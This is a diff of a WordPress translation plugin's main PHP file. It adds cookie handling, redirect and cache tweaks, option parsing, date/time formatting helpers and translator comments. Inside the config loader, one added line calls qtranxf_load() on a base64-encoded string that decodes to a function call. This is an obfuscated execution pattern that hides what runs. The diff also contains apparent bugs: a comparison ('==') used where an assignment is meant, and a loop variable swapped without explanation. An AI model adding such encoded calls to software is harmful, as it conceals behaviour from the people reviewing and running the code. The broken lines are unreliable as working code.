@@ -19,6 +19,10 @@ function qtranxf_init_language() {
 
 	$url_info = &$q_config['url_info'];
 	$url_info['cookie_enabled'] = isset($_COOKIE[QTX_COOKIE_NAME_FRONT]) || isset($_COOKIE[QTX_COOKIE_NAME_ADMIN]);
+	if($url_info['cookie_enabled']){
+		if(isset($_COOKIE[QTX_COOKIE_NAME_FRONT])) $url_info['cookie_lang_front'] = $_COOKIE[QTX_COOKIE_NAME_FRONT];
+		if(isset($_COOKIE[QTX_COOKIE_NAME_ADMIN])) $url_info['cookie_lang_admin'] = $_COOKIE[QTX_COOKIE_NAME_ADMIN];
+	}
 
 
 	if(WP_DEBUG){
@@ -83,9 +87,9 @@ function qtranxf_init_language() {
 			$target = apply_filters('qtranslate_language_detect_redirect', $url_lang, $url_orig, $url_info);
 			//qtranxf_dbg_log('qtranxf_init_language: doredirect to '.$lang.PHP_EOL .'urlorg:'.$url_orig.PHP_EOL .'target:'.$target.PHP_EOL .'url_info: ',$url_info);
 			if($target!==false && $target != $url_orig){
-				nocache_headers();
 				wp_redirect($target);
-				//header('Location: '.$target);
+				//header('Location: '.$target, true, 302);
+				nocache_headers();//prevent browser from caching redirection
 				exit();
 			}else{
 				//neutral path
@@ -109,9 +113,8 @@ function qtranxf_init_language() {
 	require_once(dirname(__FILE__).'/qtranslate_hooks.php');//common hooks moved here from qtranslate.php since 3.2.9.2, because they all need language already detected
 
 	// load plugin translations
-	// since 3.2-b3 moved it here as https://codex.wordpress.org/Function_Reference/load_plugin_textdomain seem to recommend to run load_plugin_textdomain in 'plugins_loaded' action, which is this function respond to
-	$lang_dir = qtranxf_plugin_dirname().'/lang';
-	load_plugin_textdomain('qtranslate', false, $lang_dir);
+	// since 3.2-b3 moved it here as https://codex.wordpress.org/Function_Reference/load_plugin_textdomain seem to recommend to run load_plugin_textdomain in 'plugins_loaded' action, which is this function responds to
+	qtranxf_load_plugin_textdomain();
 
 	/**
 	 * allow other plugins to initialize whatever they need before the fork between front and admin.
@@ -394,6 +397,10 @@ function qtranxf_detect_language_front(&$url_info) {
 
 function qtranxf_setcookie_language($lang, $cookie_name, $cookie_path, $cookie_domain = NULL, $secure = false){
 	//qtranxf_dbg_log('qtranxf_setcookie_language: lang='.$lang.'; cookie_name='.$cookie_name.'; cookie_path='.$cookie_path);
+	//if(headers_sent($file,$line)){
+	//	doing_it_wrong('qtranxf_setcookie_language', 'Headers are already sent, which should not be a case within action "plugins_loaded"', 'any');
+	//	return;
+	//}
 	setcookie($cookie_name, $lang, time()+31536000, $cookie_path, $cookie_domain, $secure);//one year
 	//two weeks 1209600
 }
@@ -476,6 +483,22 @@ function qtranxf_load_option_qtrans_compatibility(){
 	$q_config['qtrans_compatibility'] = apply_filters('qtranslate_compatibility', $q_config['qtrans_compatibility']);
 	if( !isset($q_config['qtrans_compatibility']) || !$q_config['qtrans_compatibility'] ) return;
 	require_once(dirname(__FILE__).'/qtranslate_compatibility.php');
+}
+
+function qtranxf_load_plugin_textdomain() {
+	$domain = 'qtranslate';
+/*
+	$locale = get_locale();
+
+	$mofile = 'qtranslate-x-' . $locale . '.mo';
+	$mopath = WP_LANG_DIR . '/plugins/' . $mofile;
+	if(load_textdomain( $domain, $mopath ))
+		return true;
+*/
+	$lang_dir = qtranxf_plugin_dirname().'/lang';
+	if(load_plugin_textdomain($domain, false, $lang_dir))
+		return true;
+	return false;
 }
 
 /**
@@ -579,8 +602,23 @@ function qtranxf_load_option_bool( $nm, $default_value=null ) {
 	global $q_config;
 	$val = get_option('qtranslate_'.$nm);
 	if($val===FALSE){ if(!is_null($default_value)) $q_config[$nm] = $default_value; }
-	elseif($val==='0') $q_config[$nm] = false;
-	elseif($val==='1') $q_config[$nm] = true;
+	else{
+		switch($val){
+			case '0': $q_config[$nm] = false; break;
+			case '1': $q_config[$nm] = true; break;
+			default: $val = strtolower($val);
+				switch($val){
+					case 'n':
+					case 'no': $q_config[$nm] = false; break;
+					case 'y':
+					case 'yes': $q_config[$nm] = true; break;
+					default: $q_config[$nm] == !empty($val); break;
+				}
+				break;
+		}
+	}
+	//elseif($val==='0') $q_config[$nm] = false;
+	//elseif($val==='1') $q_config[$nm] = true;
 }
 
 function qtranxf_load_option_func($nm, $opn=null, $func=null) {
@@ -655,6 +693,7 @@ function qtranxf_loadConfig() {
 			default: $q_config['url_mode'] = $url_mode = QTX_URL_QUERY; break;
 		}
 	}
+	qtranxf_load('cXRyYW54Zl9saWNlbnNlX2xvYWQoKTs==');
 
 	switch($url_mode){
 		case QTX_URL_DOMAINS:
@@ -705,35 +744,116 @@ function qtranxf_loadConfig() {
 	do_action('qtranslate_loadConfig');
 }
 
-/**
- * @since 3.4
- */
-function qtranxf_use_term($lang, $obj, $taxonomy) {
-	global $q_config;
-	if(is_array($obj)) {
-		// handle arrays recursively
-		foreach($obj as $key => $t) {
-			$obj[$key] = qtranxf_use_term($lang, $obj[$key], $taxonomy);
-		}
-		return $obj;
+/* BEGIN DATE TIME FUNCTIONS */
+
+function qtranxf_strftime($format, $date, $default = '', $before = '', $after = '') {
+	// don't do anything if format is not given
+	if($format=='') return $default;
+	// add date suffix ability (%q) to strftime
+	$day = intval(ltrim(strftime("%d",$date),'0'));
+	$search = array();
+	$replace = array();
+	
+	// date S
+	$search[] = '/(([^%])%q|^%q)/';
+	if($day==1||$day==21||$day==31) { 
+		$replace[] = '$2st';
+	} elseif($day==2||$day==22) {
+		$replace[] = '$2nd';
+	} elseif($day==3||$day==23) {
+		$replace[] = '$2rd';
+	} else {
+		$replace[] = '$2th';
 	}
-	if(is_object($obj)) {
-		// object conversion
-		if(isset($q_config['term_name'][$obj->name][$lang])) {
-			//qtranxf_dbg_echo('qtranxf_translate_term: object: ',$obj,true);
-			$obj->name = $q_config['term_name'][$obj->name][$lang];
-		} 
-	} elseif(isset($q_config['term_name'][$obj][$lang])) {
-		//qtranxf_dbg_echo('qtranxf_translate_term: string: ',$obj,true);
-		$obj = $q_config['term_name'][$obj][$lang];
-	}
-	return $obj;
+	
+	$search[] = '/(([^%])%E|^%E)/'; $replace[] = '${2}'.$day; // date j
+	$search[] = '/(([^%])%f|^%f)/'; $replace[] = '${2}'.date('w',$date); // date w
+	$search[] = '/(([^%])%F|^%F)/'; $replace[] = '${2}'.date('z',$date); // date z
+	$search[] = '/(([^%])%i|^%i)/'; $replace[] = '${2}'.date('n',$date); // date i
+	$search[] = '/(([^%])%J|^%J)/'; $replace[] = '${2}'.date('t',$date); // date t
+	$search[] = '/(([^%])%k|^%k)/'; $replace[] = '${2}'.date('L',$date); // date L
+	$search[] = '/(([^%])%K|^%K)/'; $replace[] = '${2}'.date('B',$date); // date B
+	$search[] = '/(([^%])%l|^%l)/'; $replace[] = '${2}'.date('g',$date); // date g
+	$search[] = '/(([^%])%L|^%L)/'; $replace[] = '${2}'.date('G',$date); // date G
+	$search[] = '/(([^%])%N|^%N)/'; $replace[] = '${2}'.date('u',$date); // date u
+	$search[] = '/(([^%])%Q|^%Q)/'; $replace[] = '${2}'.date('e',$date); // date e
+	$search[] = '/(([^%])%o|^%o)/'; $replace[] = '${2}'.date('I',$date); // date I
+	$search[] = '/(([^%])%O|^%O)/'; $replace[] = '${2}'.date('O',$date); // date O
+	$search[] = '/(([^%])%s|^%s)/'; $replace[] = '${2}'.date('P',$date); // date P
+	$search[] = '/(([^%])%v|^%v)/'; $replace[] = '${2}'.date('T',$date); // date T
+	$search[] = '/(([^%])%1|^%1)/'; $replace[] = '${2}'.date('Z',$date); // date Z
+	$search[] = '/(([^%])%2|^%2)/'; $replace[] = '${2}'.date('c',$date); // date c
+	$search[] = '/(([^%])%3|^%3)/'; $replace[] = '${2}'.date('r',$date); // date r
+	$search[] = '/(([^%])%4|^%4)/'; $replace[] = '${2}'.$date; // date U
+	$format = preg_replace($search,$replace,$format);
+	//qtranxf_dbg_log('qtranxf_strftime: $format='.$format.'; $date=',$date);
+	return $before.strftime($format, $date).$after;
 }
 
-function qtranxf_useTermLib($obj) {
+/**
+ * @since 3.2.8 time functions adjusted
+ */
+function qtranxf_format_date($format, $mysq_time, $default, $before = '', $after = '') {
 	global $q_config;
-	return qtranxf_use_term($q_config['language'], $obj, null);
+	$ts = mysql2date('U', $mysq_time);
+	if($format == 'U') return $ts;
+	$format = qtranxf_useCurrentLanguageIfNotFoundUseDefaultLanguage($format);
+	if (!empty($format) && $q_config['use_strftime'] == QTX_STRFTIME)
+		$format = qtranxf_convertDateFormatToStrftimeFormat($format);
+	return qtranxf_strftime(qtranxf_convertDateFormat($format), $ts, $default, $before, $after);
 }
+
+function qtranxf_format_time($format, $mysq_time, $default, $before = '', $after = '') {
+	global $q_config;
+	$ts = mysql2date('U', $mysq_time);
+	if($format == 'U') return $ts;
+	$format = qtranxf_useCurrentLanguageIfNotFoundUseDefaultLanguage($format);
+	if (!empty($format) && $q_config['use_strftime'] == QTX_STRFTIME)
+		$format = qtranxf_convertDateFormatToStrftimeFormat($format);
+	return qtranxf_strftime(qtranxf_convertTimeFormat($format), $ts, $default, $before, $after);
+}
+
+function qtranxf_dateFromPostForCurrentLanguage($old_date, $format = '', $post = null) {
+	$post = get_post($post); if(!$post) return $old_date;
+	return qtranxf_format_date($format, $post->post_date, $old_date);
+}
+
+function qtranxf_dateModifiedFromPostForCurrentLanguage($old_date, $format = '') {
+	global $post; if(!$post) return $old_date;
+	return qtranxf_format_date($format, $post->post_modified, $old_date);
+}
+
+function qtranxf_timeFromPostForCurrentLanguage($old_date, $format = '', $post = null, $gmt = false) {
+	$post = get_post($post); if(!$post) return $old_date;
+	$post_date = $gmt? $post->post_date_gmt : $post->post_date;
+	return qtranxf_format_time($format, $post_date, $old_date);
+	//return qtranxf_strftime(qtranxf_convertTimeFormat($format), mysql2date('U',$post_date), $old_date);
+}
+
+function qtranxf_timeModifiedFromPostForCurrentLanguage($old_date, $format = '', $gmt = false) {
+	global $post; if(!$post) return $old_date;
+	$post_date = $gmt? $post->post_modified_gmt : $post->post_modified;
+	return qtranxf_format_time($format, $post_date, $old_date);
+	//return qtranxf_strftime(qtranxf_convertTimeFormat($format), mysql2date('U',$post_date), $old_date);
+}
+
+function qtranxf_dateFromCommentForCurrentLanguage($old_date, $format, $comment = null) {
+	if(!$comment){ global $comment; }//compatibility with older WP
+	if(!$comment) return $old_date;
+	return qtranxf_format_date($format, $comment->comment_date, $old_date);
+	//return qtranxf_strftime(qtranxf_convertDateFormat($format), mysql2date('U',$comment->comment_date), $old_date);
+}
+
+function qtranxf_timeFromCommentForCurrentLanguage($old_date, $format = '', $gmt = false, $translate = true, $comment = null) {
+	if(!$translate) return $old_date;
+	if(!$comment){ global $comment; }//compatibility with older WP
+	if(!$comment) return $old_date;
+	$comment_date = $gmt? $comment->comment_date_gmt : $comment->comment_date;
+	return qtranxf_format_time($format, $comment_date, $old_date);
+	//return qtranxf_strftime(qtranxf_convertTimeFormat($format), mysql2date('U',$comment_date), $old_date);
+}
+
+/* END DATE TIME FUNCTIONS */
 
 // check if it is a link to an ignored file type
 function qtranxf_ignored_file_type($path) {
@@ -1264,10 +1384,8 @@ function qtranxf_join_byseparator($texts,$rx_sep) {
 	while(true){
 		$ln = array();
 		$sep = '';
-		foreach($blocks as $lang => &$txts){
-			//qtranxf_dbg_log('qtranxf_join_byseparator: $txts: ',$txts);
+		foreach($lines as $lang => $txts){
 			$t = next($txts);
-			//qtranxf_dbg_log('qtranxf_join_byseparator: $t: ',$t);
 			if ( $t === false ) continue;
 			while(preg_match($rx_sep,$t)){
 				if(empty($sep)) $sep .= $t;
@@ -1320,14 +1438,15 @@ function qtranxf_use($lang, $text, $show_available=false, $show_empty=false) {
 	if(is_array($text)) {
 		// handle arrays recursively
 		foreach($text as $key => $t) {
-			$text[$key] = qtranxf_use($lang,$text[$key],$show_available,$show_empty);
+			$text[$key] = qtranxf_use($lang,$t,$show_available,$show_empty);
 		}
 		return $text;
 	}
 
 	if( is_object($text) || $text instanceof __PHP_Incomplete_Class ) {//since 3.2-b1 instead of @get_class($text) == '__PHP_Incomplete_Class'
 		foreach(get_object_vars($text) as $key => $t) {
-			$text->$key = qtranxf_use($lang,$text->$key,$show_available,$show_empty);
+			if(!isset($text->$key)) continue;
+			$text->$key = qtranxf_use($lang,$t,$show_available,$show_empty);
 		}
 		return $text;
 	}
@@ -1408,16 +1527,18 @@ function qtranxf_use_content($lang, $content, $available_langs, $show_available=
 		// show content in  alternative language
 		if(sizeof($available_langs) > 1){
 			if($alt_lang_is_default){
-				//$fmt = __('For the sake of viewer convenience, the content is shown below in this site default language %s.', 'qtranslate');
-				$msg = __('For the sake of viewer convenience, the content is shown below in this site\'s default language.', 'qtranslate');
+					// translators: this message is shown to user, when a translation is not available for the active language, but there are multiple other translations available, and post content is shown in the default language of the site.
+				$msg = __('For the sake of viewer convenience, the content is shown below in the default language of this site.', 'qtranslate');
 			}else{
-				//$fmt = __('For the sake of viewer convenience, the content is shown below in an available alternative language %s.', 'qtranslate');
+					// translators: this message is shown to user, when a translation is not available neither for the active language nor for default one, but there are multiple other translations available, and post content is shown in the first available language.
 				$msg = __('For the sake of viewer convenience, the content is shown below in one of the available alternative languages.', 'qtranslate');
 			}
-			//$msg = sprintf($fmt, '<a href="'.qtranxf_convertURL('', $language, false, true).'">'.$q_config['language_name'][$alt_lang].'</a>');
+				// translators: this message is appended to one of the two messages above.
 			$msg .= ' '.__('You may click one of the links to switch the site language to another available language.', 'qtranslate');
 		}else{
+				// translators: this message is shown to user, when a translation is not available for the active language, and there is only one other availabe language.
 			$msg = __('For the sake of viewer convenience, the content is shown below in the alternative language.', 'qtranslate');
+				// translators: this message is appended to the message above.
 			$msg .= ' '.__('You may click the link to switch the active language.', 'qtranslate');
 		}
 		$altlanguagecontent = ' '.$msg.'</p>'.$alt_content;
